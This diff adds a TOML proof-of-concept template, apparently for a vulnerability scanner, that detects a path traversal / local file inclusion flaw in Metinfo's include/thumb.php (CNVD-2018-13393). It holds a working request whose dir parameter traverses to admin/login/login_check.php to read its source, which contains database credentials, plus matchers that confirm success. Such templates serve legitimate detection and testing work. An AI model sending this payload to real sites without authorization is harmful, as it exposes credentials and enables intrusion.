@@ -1,0 +1,27 @@
+[info]
+id = "POC-AVE-2026-0028"
+name = "Metinfo include/thumb.php 本地文件包含 PoC"
+author = "AVE"
+severity = "high"
+tags = ["lfi", "path-traversal", "cwe-22", "metinfo", "cnvd-2018-13393"]
+description = "Metinfo（米拓建站系统）的 /include/thumb.php 文件中 dir 参数存在路径遍历漏洞，攻击者可读取任意 PHP 文件源码，如读取 /admin/login/login_check.php 获取数据库连接凭据。"
+vuln_id = ["CNVD-2018-13393", "AVE-2026-0028"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/include/thumb.php"
+query.dir = "http\\..\\admin\\login\\login_check.php"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["<?php", "login_met_cookie"]
+expect = true
